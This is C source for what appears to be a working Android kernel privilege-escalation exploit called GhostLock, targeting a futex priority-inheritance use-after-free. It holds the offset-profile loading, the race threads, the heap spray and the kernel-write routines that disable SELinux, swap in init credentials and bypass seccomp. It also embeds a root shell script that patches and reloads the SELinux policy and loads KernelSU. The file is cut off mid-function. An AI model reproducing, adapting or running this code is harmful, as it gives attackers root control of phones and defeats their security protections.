/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
 * independent root shell: ksud late-load + module watch.
 */

#include "common.h"
#include "profile.h"
#include <ctype.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/perf_event.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <strings.h>

#include "target.h"

const struct kernel_offsets *active_offsets = NULL;
TargetProfile g_target_profile;
// TODO(decoupling:S08-profile): Future: pass const TargetProfile to consumers.
// Input: resolved immutable profile; output: no active_offsets compatibility mirror.
// Blocked by: runtime offset/payload macros; completion in S08 removes this comment.

// TODO(decoupling:S14-session): Future: pass RuntimeConfig via ExploitSession.
// Input: const session config; output: paths without process-global aliases.
// Blocked by: victim/handoff orchestration is centralized in main until S14.
#define g_home_dir (g_runtime_config.home_dir)
#define g_root_script_path (g_runtime_config.root_script_path)

/* Override target.h _OFF macros with the resolved runtime profile. */
#undef SELINUX_ENFORCING_OFF
#undef INIT_CRED_OFF
#undef INIT_TASK_OFF
#undef ROOT_TASK_GROUP_OFF
#undef SELINUX_BLOB_SIZES_OFF
#undef SECURITY_HOOK_HEADS_OFF
#undef SLIDE_NFULNL_LOGGER_OFF
#undef SLIDE_LOGGERS_0_1_OFF
#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
#undef SLIDE_SYSCTL_BOOTID_OFF

#define SELINUX_ENFORCING_OFF         active_offsets->off_selinux_enforcing
#define INIT_CRED_OFF                 active_offsets->off_init_cred
#define INIT_TASK_OFF                 active_offsets->off_init_task
#define ROOT_TASK_GROUP_OFF           active_offsets->off_root_task_group
#define SELINUX_BLOB_SIZES_OFF        active_offsets->off_selinux_blob_sizes
#define SECURITY_HOOK_HEADS_OFF       active_offsets->off_security_hook_heads
#define SLIDE_NFULNL_LOGGER_OFF       active_offsets->off_slide_nfulnl_logger
#define SLIDE_LOGGERS_0_1_OFF         active_offsets->off_slide_loggers_0_1
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
#define SLIDE_SYSCTL_BOOTID_OFF       active_offsets->off_slide_boot_id

/* Override struct field offsets (task_struct, etc.) with per-device values */
#include "runtime_struct_offsets.h"
/* VR.ko anti-root fallback defines */
#ifndef VR_TAG_A_OFF
#define VR_TAG_A_OFF           0x06
#endif
#ifndef VR_TAG_B_OFF
#define VR_TAG_B_OFF           0x2c
#endif
#ifndef VR_SYSCALL_TP_FLAG
#define VR_SYSCALL_TP_FLAG     0x400ULL
#endif
#ifndef TASK_THREAD_INFO_FLAGS_OFF
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#endif
#include "offsets_json.h"

// TODO(decoupling:S08-profile): Replace this transport storage and offset macros
// with semantic TargetProfile accessors passed to consumers.
static struct kernel_offsets g_external_offsets;
static char g_external_release[192];

/* Decoupling plan: validate common and chain-specific target metadata. Input:
 * candidate profile; output: structured validation result. Future:
 * target_profile_validate(const TargetProfile *, ValidationError *). */
static int validate_offsets_profile(const struct kernel_offsets *entry) {
  if (!entry || !entry->uname_r || !entry->off_init_task ||
      !entry->off_init_cred || !entry->off_root_task_group ||
      !entry->off_selinux_enforcing || !entry->task_prio ||
      !entry->task_pi_lock || !entry->task_pi_waiters ||
      !entry->task_pi_blocked_on || !entry->task_cred ||
      !entry->task_seccomp) {
    pr_error("offset profile is incomplete\n");
    return -1;
  }
  if ((entry->kernel_major != 5 && entry->kernel_major != 6) ||
      !entry->cred_copy_size ||
      entry->cred_usage_offset + sizeof(uint32_t) > entry->cred_copy_size ||
      !entry->cred_caps_count ||
      entry->cred_caps_offset + entry->cred_caps_count * sizeof(uint64_t) >
          entry->cred_copy_size || entry->cred_ref_count > 4) {
    pr_error("offset profile has no valid kernel family or credential template\n");
    return -1;
  }
  const uint32_t cred_ref_offsets[] = {
      entry->cred_ref0_offset, entry->cred_ref1_offset,
      entry->cred_ref2_offset, entry->cred_ref3_offset,
  };
  const uint64_t cred_ref_images[] = {
      entry->cred_ref0_image, entry->cred_ref1_image,
      entry->cred_ref2_image, entry->cred_ref3_image,
  };
  for (uint32_t i = 0; i < entry->cred_ref_count; i++) {
    if (!cred_ref_images[i] ||
        cred_ref_offsets[i] + sizeof(uint64_t) > entry->cred_copy_size) {
      pr_error("offset profile credential reference %u is invalid\n", i);
      return -1;
    }
  }
  if (entry->kernel_major == 5) {
    if (!entry->off_empty_zero_page || !entry->off_mcast_fake_bss ||
        !entry->compact_waiter ||
        !entry->mm_struct_sz ||
        entry->mcast_waiter_off <= 0 ||
        !entry->mcast_buffer_size ||
        entry->mcast_waiter_off + entry->mcast_lock_offset + sizeof(uint64_t) >
            entry->mcast_buffer_size ||
        !entry->mcast_task_offset || !entry->mcast_lock_offset ||
        !entry->mcast_fake_lock_offset || !entry->mcast_fake_task_offset ||
        !entry->mcast_lock_slots_offset ||
        !entry->mcast_lock_slot_count || !entry->mcast_lock_slot_stride ||
        entry->cred_copy_size < 0xa0 || !entry->cred_ref_count) {
      pr_error("5.x profile requires empty_zero_page, compact waiter, "
               "credential references, an mm_struct stride, and complete "
               "multicast geometry\n");
      return -1;
    }
  }
  return 0;
}

static void log_execution_settings(const struct kernel_offsets *profile) {
  if (!profile || !g_runtime_config.verbose_debug) return;
  const struct execution_settings *e = &profile->execution;
#define LOG_EXEC(key, value) pr_info("debug.execution.%s=%u\n", key, (unsigned)(value))
  pr_info("debug.execution.begin release=%s\n", profile->uname_r);
  LOG_EXEC("recommended_cpus.main", e->recommended_main_cpu);
  LOG_EXEC("recommended_cpus.consumer", e->recommended_consumer_cpu);
  LOG_EXEC("selected_cpus.main", g_runtime_config.main_cpu);
  LOG_EXEC("selected_cpus.consumer", g_runtime_config.consumer_cpu);
  LOG_EXEC("heap.prepare_max_attempts", e->heap_prepare_max_attempts);
  LOG_EXEC("heap.prepare_timeout_ms", e->heap_prepare_timeout_ms);
  LOG_EXEC("heap.kernelsnitch_timeout_ms", e->heap_kernelsnitch_timeout_ms);
  LOG_EXEC("race.route_wait_ms", e->race_route_wait_ms);
  LOG_EXEC("race.setup_settle_us", e->race_setup_settle_us);
  LOG_EXEC("race.state_poll_interval_us", e->race_state_poll_interval_us);
  LOG_EXEC("stages.w1_attempts", e->w1_attempts);
  LOG_EXEC("stages.w1_settle_us", e->w1_settle_us);
  LOG_EXEC("stages.w1_scratch_repair_attempts", e->w1_scratch_repair_attempts);
  LOG_EXEC("stages.w2_attempts", e->w2_attempts);
  LOG_EXEC("stages.w2_settle_us", e->w2_settle_us);
  LOG_EXEC("stages.w3_chain_rounds", e->w3_chain_rounds);
  LOG_EXEC("stages.w3_attempts", e->w3_attempts);
  LOG_EXEC("stages.w3_settle_us", e->w3_settle_us);
  LOG_EXEC("routes.tcp_zerocopy.attempts", e->tcp_attempts);
  LOG_EXEC("routes.tcp_zerocopy.arm_sequence", e->tcp_arm_sequence);
  LOG_EXEC("routes.tcp_zerocopy.post_receive_hold_iterations",
           e->tcp_post_receive_hold_iterations);
  LOG_EXEC("routes.select_stack.enter_delay_us", e->select_enter_delay_us);
  LOG_EXEC("routes.select_stack.timeout_us", e->select_timeout_us);
  LOG_EXEC("routes.select_stack.consumer_max_calls", e->select_consumer_max_calls);
  LOG_EXEC("routes.select_stack.consumer_burst_calls",
           e->select_consumer_burst_calls);
  LOG_EXEC("routes.multicast_waiter.ready_timeout_ms",
           e->multicast_ready_timeout_ms);
  LOG_EXEC("routes.multicast_waiter.post_requeue_settle_us",
           e->multicast_post_requeue_settle_us);
  LOG_EXEC("routes.multicast_waiter.post_adjust_settle_us",
           e->multicast_post_adjust_settle_us);
  LOG_EXEC("handoff.pre_dispatch_settle_ms", e->handoff_pre_dispatch_settle_ms);
  LOG_EXEC("handoff.module_poll_attempts", e->handoff_module_poll_attempts);
  LOG_EXEC("handoff.module_poll_interval_ms", e->handoff_module_poll_interval_ms);
  LOG_EXEC("handoff.enforce_poll_attempts", e->handoff_enforce_poll_attempts);
  LOG_EXEC("handoff.enforce_poll_interval_ms", e->handoff_enforce_poll_interval_ms);
  pr_info("debug.execution.end\n");
#undef LOG_EXEC
}

/* Entries carry a phys load address only when measured; otherwise MTK uses
 * the DRAM base, xring its constant, qcom its GKI version. */
/* Decoupling plan: publish derived addresses for the selected profile. Inputs:
 * profile and RuntimeConfig; output: ResolvedAddresses. Future:
 * resolve_runtime_addresses(), without modifying process globals. */
static int publish_active_offsets(void) {
  g_target_profile = target_profile_view(active_offsets);
  if (resolved_addresses_init(&g_resolved_addresses, &g_target_profile) != 0)
    return -1;
  p0_kernel_phys_load = g_resolved_addresses.kernel_phys_load;
  g_init_cred_image = g_resolved_addresses.init_cred_image;
  pr_info("soc: %s; kernel_phys_load=0x%llx\n",
          resolved_addresses_soc_name(&g_resolved_addresses, &g_target_profile),
          (unsigned long long)g_resolved_addresses.kernel_phys_load);
  pr_info("init_cred image=%016zx alias=%016zx\n",
          (size_t)g_resolved_addresses.init_cred_image,
          (size_t)resolved_addresses_data_alias(
              &g_resolved_addresses, g_resolved_addresses.init_cred_image));
  return 0;
}

/* Decoupling plan: select, validate and resolve the active profile. Inputs:
 * runtime release/config; output: immutable TargetProfile. Future: split into
 * target_profile_select() and resolve_runtime_addresses(). */
static int select_offsets(const char *profile_path) {
  struct utsname uts;
  if (uname(&uts) < 0) return -1;
  pr_info("kernel: %s\n", uts.release);
#ifdef TARGET_KERNEL_RELEASE
  if (strcmp(uts.release, TARGET_KERNEL_RELEASE) != 0) {
    pr_error("build requires kernel %s, got %s\n",
             TARGET_KERNEL_RELEASE, uts.release);
    return -1;
  }
#endif
  if (!profile_path ||
      load_resolved_profile_json(profile_path, &g_external_offsets,
                                 g_external_release,
                                 sizeof(g_external_release)) != 0) {
    pr_error("cannot load resolved profile: %s\n",
             profile_path ? profile_path : "<missing --profile>");
    return -1;
  }
  if (strcmp(g_external_release, uts.release) != 0) {
    pr_error("profile release mismatch: expected %s, got %s\n", uts.release,
             g_external_release);
    return -1;
  }
  if (validate_offsets_profile(&g_external_offsets) != 0) return -1;
  active_offsets = &g_external_offsets;
  pr_success("resolved profile loaded: %s\n", active_offsets->uname_r);
  log_execution_settings(active_offsets);
  if (publish_active_offsets() != 0) {
    pr_error("cannot resolve profile address space\n");
    return -1;
  }
  return 0;
}

static struct timespec t0;
/* Decoupling plan: reset top-level elapsed time. Input/output: implicit timer;
 * future: exploit_timeline_start(ExploitTimeline *). */
static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
/* Decoupling plan: read top-level elapsed time. Input: timeline reference;
 * output: milliseconds. Future: exploit_timeline_elapsed(const timeline *). */
static double timer_ms(void) {
  return runtime_elapsed_ms(&t0);
}
#define TIMER(label) do { \
    pr_info("[T+%.0fms] %s\n", timer_ms(), label); \
    log_sync(); \
  } while (0)

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int owner_stop;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int consumer_inflight;
atomic_int main_route_delay_usec;
static atomic_int fast_repair_route;
int memfd_leak;

/* Decoupling plan: run the shared PI waiter and delegate route execution.
 * Input: currently implicit race/session state; output: completion/status.
 * Future: pi_race_waiter_worker(void *PiRaceWorkerArgs); route dispatch moves
 * to the stage controller. */
void *waiter_thread(void *arg) {
  const WriteRequest *request = arg;
  disable_rseq_for_thread();
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_warning("waiter lock chain errno=%d\n", errno);
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) usleep(1000);
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  if (atomic_load(&fast_repair_route)) {
    timeout.tv_nsec += 20000000L;
    if (timeout.tv_nsec >= 1000000000L) {
      timeout.tv_sec++;
      timeout.tv_nsec -= 1000000000L;
    }
  } else {
    timeout.tv_sec += ROUTE_WAIT_SECONDS;
  }
  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  if (kernel5_route_selected()) {
    do_kernel5_fake_lock_route(request);
    /* remove_waiter() left this thread's pi_blocked_on pointing at the
     * reclaimed stack waiter. Force one final slow-path removal while the
     * stack frame is still alive, matching the 5.x multicast primitive's
     * disarm step. Without this, thread exit leaves a walkable dangling
     * ghost and the next mm_struct spray can panic the kernel. */
    uint32_t dummy_pi = 0x80000000U | (uint32_t)getpid();
    struct timespec expired = {.tv_sec = 0, .tv_nsec = 0};
    errno = 0;
    long disarm = futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &expired, NULL, 0);
    pr_info("mcast ghost disarm ret=%ld errno=%d\n", disarm, errno);
  } else if (tcp_route_selected()) {
    do_tcp_fake_lock_route(request);
  } else {
    do_pselect_fake_lock_route(request);
  }
  atomic_store(&route_done, 1);
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) usleep(1000);
  return NULL;
}

/* Decoupling plan: own the target and chain PI futexes. Input: PiRaceContext;
 * output: synchronization state. Future: pi_race_owner_worker(void *context). */
void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) pr_warning("owner lock target errno=%d\n", errno);
  while (!atomic_load(&waiter_ready)) usleep(1000);
  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);
  while (!atomic_load(&owner_stop)) sleep(1);
  if (lock_target == 0)
    futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  return NULL;
}

/* Decoupling plan: trigger PI traversal from the consumer CPU. Inputs:
 * PiRaceContext, TargetProfile and RuntimeConfig; output: attempt counters.
 * Future: pi_race_consumer_worker(void *PiRaceWorkerArgs). */
void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
  int seen = 0;
  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) usleep((useconds_t)delay_usec);
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) break;
        atomic_fetch_add(&consumer_calls, 1);
        atomic_store(&consumer_inflight, 1);
        errno = 0;
        /* rotate the nice every call; (calls%19)+1 is what makes
         * sched_setattr succeed on 6.1 compact */
        int consumer_nice = (active_offsets && active_offsets->compact_waiter)
                                ? (calls_this_seq % 19) + 1
                                : PSELECT_CONSUMER_NICE;
        long sched_ret = sched_setattr_tid(tid, consumer_nice);
        if (sched_ret != 0) {
          struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
          if (fret == 0) {
            futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            sched_ret = 0;
          }
        }
        if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
        atomic_store(&consumer_inflight, 0);
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }
  return NULL;
}

/* Decoupling plan: reset one PI race attempt. Input/output: PiRaceContext;
 * output: initialized synchronization state. Future: pi_race_reset(). */
void reset_main_route_state(void) {
  f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
  atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
  atomic_store(&owner_stop, 0);
  atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
  atomic_store(&consumer_inflight, 0);
  atomic_store(&main_route_delay_usec,
               atomic_load(&fast_repair_route) ? 5000
                                                : PSELECT_ENTER_DELAY_USEC);
  route_last_step = 0; route_last_errno = 0;
}

/* Decoupling plan: create, synchronize and join one PI race. Inputs: race and
 * selected route contexts; output: RouteStatus. Future: pi_race_run(), with
 * partial-thread-start cleanup and no route_last_* globals. */
int run_main_route_threads(const WriteRequest *request) {
  reset_main_route_state();
  pthread_t waiter, owner, consumer;
  pr_info("[route] creating waiter/owner/consumer\n");
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, (void *)request));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
    usleep(1000);
  pr_info("[route] waiter parked; owner started\n");
  usleep(atomic_load(&fast_repair_route) ? 5000 : 50000);
  errno = 0;
  long rq = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                     &f_pi_target, 0);
  pr_info("[route] CMP_REQUEUE_PI ret=%ld errno=%d; waiting route_done\n",
          rq, errno);
  while (!atomic_load(&route_done)) usleep(5000);
  pr_info("[route] route_done step=%d errno=%d calls=%d success=%d\n",
          route_last_step, route_last_errno, atomic_load(&consumer_calls),
          atomic_load(&consumer_success));

  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 1);
  atomic_store(&owner_stop, 1);
  pthread_join(waiter, NULL);
  pthread_join(owner, NULL);
  pthread_join(consumer, NULL);
  pr_info("[route] threads joined\n");

  return atomic_load(&consumer_calls) > 0 &&
         atomic_load(&consumer_success) > 0 && route_last_step == 0;
}

/* Decoupling plan: prepare payload and execute one abstract kernel write.
 * Inputs: session and immutable WriteRequest; output: RouteStatus. Future:
 * exploit_execute_write(session, request), separating heap and route phases. */
static int do_one_write(const WriteRequest *request, const char *desc) {
  pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc,
          request->target, request->mode, !request->preserve_child);
  /* Both transports write *(target) := value through the erase left-only
   * relink: waiter words are {pc = value, right = 0, left = target} and
   * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
  if (kernel5_route_selected() &&
      g_runtime_config.multicast_resident_enabled) {
    if (!kernel5_resident_start()) {
      pr_warning("5.x resident multicast setup failed\n");
      return 0;
    }
    uintptr_t value = !request->preserve_child
        ? 0
        : (request->mode == WRITE_MODE_CREDENTIAL
               ? data_addr(g_init_cred_image)
               : data_addr(EMPTY_ZERO_PAGE));
    int ok = kernel5_resident_write(request->target, value);
    return ok;
  }
  TIMER("  heap spray start");
  page_base = prepare_good_kernel_page(request);
  if (!page_base) { pr_warning("  heap spray failed\n"); return 0; }
  TIMER("  heap spray done");
  int routed = run_main_route_threads(request);
  TIMER("  PI route done");
  if (!routed) {
    pr_warning("  PI route did not produce a verified write\n");
  }
  return routed;
}

static int check_selinux_off(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (efd < 0) {
    /* untrusted_app often cannot read enforce while SELinux is enforcing. */
    return 0;
  }
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  return b[0] == '0';
}

static int enforce_readable(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (efd < 0) return 0;
  close(efd);
  return 1;
}

static int process_has_seccomp(void) {
  /* The app flow runs inside zygote, whose seccomp filter blocks
   * finit_module(2). The adb/shell flow has no filter (Seccomp: 0), and
   * fork() inherits that, so the W2 child does not need W3 there. */
  FILE *status = fopen("/proc/self/status", "r");
  if (!status) return 0;
  char line[256];
  int seccomp = 0;
  while (fgets(line, sizeof(line), status)) {
    if (strncmp(line, "Seccomp:", 8) == 0) {
      seccomp = atoi(line + 8);
      break;
    }
  }
  fclose(status);
  return seccomp != 0;
}

/* Decoupling plan: apply the pre-attempt slab-drain policy. Input: HeapContext
 * and policy; output: status only. Future: heap_context_drain(), with all
 * temporary children owned and reaped by the context. */
static void slab_drain(void) {
  /* Keep this light in untrusted_app. Aggressive fork storms trip LMK/OOM
   * (exit 137) especially right before heap spray. */
  struct timespec up;
  clock_gettime(CLOCK_BOOTTIME, &up);
  int waves = (up.tv_sec > 60) ? 2 : 1;
  int batch = (up.tv_sec > 60) ? 64 : 32;
  for (int wave = 0; wave < waves; wave++) {
    pid_t *drain = calloc((size_t)batch, sizeof(pid_t));
    if (!drain) return;
    int n = 0;
    for (int i = 0; i < batch; i++) {
      pid_t pid = fork();
      if (pid == 0) {
        pause();
        _exit(0);
      }
      if (pid > 0) drain[n++] = pid;
      else break;
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
      waitpid(drain[i], NULL, 0);
    }
    free(drain);
    sched_yield();
    usleep(20000);
  }
}

/* Decoupling plan: materialize the post-exploit handoff script. Input: const
 * RuntimeConfig; output: file operation result. Future: handoff_script_write(),
 * returning errors rather than modifying exploit state. */
static void write_root_script(void) {
  char script[8192];
  int sfd = open(g_root_script_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
  if (sfd < 0) {
    pr_warning("open root script failed path=%s errno=%d\n",
               g_root_script_path, errno);
    return;
  }

  int n = snprintf(
      script, sizeof(script),
      "#!/system/bin/sh\n"
      "HOME_DIR='%s'\n"
      "LOG='%s'\n"
      "KSUD=\"$HOME_DIR/ksud\"\n"
      "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
      "chmod 644 \"$LOG\" 2>/dev/null\n"
      "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
      "if [ ! -x \"$KSUD\" ]; then\n"
      "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu.pr*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
      "fi\n"
      "if [ ! -x \"$KSUD\" ]; then\n"
      "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu-*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
      "fi\n"
      "if [ ! -x \"$KSUD\" ]; then\n"
      "  KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
      "fi\n"
      "if [ ! -x \"$KSUD\" ]; then\n"
      "  KSUD=$(find /data/app -path '*/com.kowx712.supermanager*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
      "fi\n"
      "if [ -z \"$KSUD\" ]; then KSUD=/data/local/tmp/ksud; fi\n"
      "if [ ! -x \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
      "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
      "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
      "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
      "if [ \"$(id -u)\" -ne 0 ]; then\n"
      "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
      "  exit 1\n"
       "fi\n"
       "# W1's 64-bit child pointer makes adjacent booleans non-zero.\n"
       "echo 0 > /sys/fs/selinux/checkreqprot 2>/dev/null\n"
       "if grep -q '^kernelsu[[:space:]]' /proc/modules 2>/dev/null; then\n"
       "  echo '[+] KernelSU already loaded' >>\"$LOG\"\n"
       "fi\n"
      "KVER=$(uname -r | cut -d. -f1-2)\n"
      "AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
      "if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then\n"
      "  echo '[!] cannot parse KMI from uname -r' >>\"$LOG\"\n"
      "  exit 1\n"
      "fi\n"
      "KMI=\"${AVER}-${KVER}\"\n"
      "# safe mode: disable all modules before exec ksud\n"
      "if [ \"$GHOSTLOCK_DISABLE_MODULES\" = \"1\" ]; then\n"
      "  echo \"[*] safe mode: disabling all modules under /data/adb/modules\" >>\"$LOG\"\n"
      "  n=0\n"
      "  for m in /data/adb/modules/*/; do\n"
      "    [ -d \"$m\" ] || continue\n"
      "    if touch \"${m}disable\" 2>/dev/null; then\n"
      "      n=$((n+1))\n"
      "      echo \"  disabled ${m}\" >>\"$LOG\"\n"
      "    fi\n"
      "  done\n"
      "  echo \"[*] safe mode: $n module(s) disabled\" >>\"$LOG\"\n"
      "fi\n"
      "# step 1: restore policy\n"
      "POLICY=$(mktemp \"$HOME_DIR/.ghostlock_policy.XXXXXX\") || {\n"
      "  echo '[!] cannot create policy dump' >>\"$LOG\"\n"
      "  exit 1\n"
      "}\n"
      "trap 'rm -f \"$POLICY\"' EXIT\n"
      "prepare_policy() {\n"
      "  cat /sys/fs/selinux/policy >\"$POLICY\" || return 1\n"
      "  HEADER=$(od -An -tx1 -N24 \"$POLICY\" | tr -d ' \\n')\n"
      "  case \"$HEADER\" in\n"
      "    8cff7cf9080000005345204c696e7578????????????????) ;;\n"
      "    *) echo '[!] invalid policy header'; return 1 ;;\n"
      "  esac\n"
      "  # Restore missing Android netlink flags: bits 30/31, byte 23.\n"
      "  CONFIG=$(od -An -tu1 -j23 -N1 \"$POLICY\") || return 1\n"
      "  [ -n \"$CONFIG\" ] || return 1\n"
      "  CONFIG=$(printf '\\\\0%%03o' \"$((CONFIG | 192))\") || return 1\n"
      "  printf '%%b' \"$CONFIG\" | dd of=\"$POLICY\" bs=1 seek=23 count=1 conv=notrunc\n"
      "}\n"
      "KSU_ALREADY=0\n"
      "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
      "  KSU_ALREADY=1\n"
      "fi\n"
      "FIXUP_RC=1\n"
      "# a reload unlabels running processes, init exits 127 on the stale SID\n"
      "for i in $(seq 1 10); do\n"
      "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
      "  if ! prepare_policy >>\"$LOG\" 2>&1; then\n"
      "    sleep 2\n"
      "    continue\n"
      "  fi\n"
      "  BEFORE_POLICYLOAD=$(od -An -tu4 -j12 -N4 /sys/fs/selinux/status 2>/dev/null | tr -d ' ')\n"
      "  load_policy \"$POLICY\" >>\"$LOG\" 2>&1 &\n"
      "  LPID=$!\n"
      "  (sleep 8; kill -9 $LPID 2>/dev/null) &\n"
      "  SPID=$!\n"
      "  wait $LPID 2>/dev/null\n"
      "  FIXUP_RC=$?\n"
      "  kill $SPID 2>/dev/null\n"
      "  if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
      "    AFTER_POLICYLOAD=$(od -An -tu4 -j12 -N4 /sys/fs/selinux/status 2>/dev/null | tr -d ' ')\n"
      "    echo \"[*] policyload before=$BEFORE_POLICYLOAD after=$AFTER_POLICYLOAD\" >>\"$LOG\"\n"
      "    if [ -n \"$AFTER_POLICYLOAD\" ] && [ \"$AFTER_POLICYLOAD\" != \"$BEFORE_POLICYLOAD\" ]; then\n"
      "      break\n"
      "    fi\n"
      "    echo '[!] load_policy returned success without updating SELinux status' >>\"$LOG\"\n"
      "    FIXUP_RC=1\n"
      "  fi\n"
      "  sleep 2\n"
      "done\n"
      "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
      "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
      "# load_policy ok: late-load only when the module is not in the tree yet\n"
      "if [ \"$KSU_ALREADY\" -eq 1 ]; then\n"
      "  echo '[+] kernelsu already loaded; no late-load' >>\"$LOG\"\n"
      "else\n"
      "  if [ ! -x \"$KSUD\" ]; then\n"
      "    echo '[!] ksud missing; cannot late-load' >>\"$LOG\"\n"
      "    exit 1\n"
      "  fi\n"
      "  echo \"[*] late-load kmi=$KMI as uid=$(id -u)\" >>\"$LOG\"\n"
      "  chmod 755 \"$KSUD\" 2>/dev/null\n"
      "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
      "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
      "  KSU_READY=0\n"
      "  for i in $(seq 1 50); do\n"
      "    if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
      "    sleep 0.1\n"
      "  done\n"
      "  if [ \"$KSU_READY\" -ne 1 ]; then\n"
      "    echo '[!] KernelSU module not loaded' >>\"$LOG\"\n"
      "    exit 1\n"
      "  fi\n"
      "  echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
      "fi\n"
      "# enforcing puts the app dir out of reach, so the native side reads\n"
      "# the outcome\n"
      "if [ \"$(cat /sys/fs/selinux/enforce 2>/dev/null)\" != \"1\" ]; then\n"
      "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
      "fi\n"
      "else\n"
      "  echo '[!] fixup failed; SELinux left permissive' >>\"$LOG\"\n"
      "fi\n"
      "exit 0\n",
      g_home_dir, g_ksu_log_path);
  if (n < 0 || n >= (int)sizeof(script)) {
    pr_warning("root script too long\n");
    close(sfd);
    return;
  }
  if (write(sfd, script, (size_t)n) != n) {
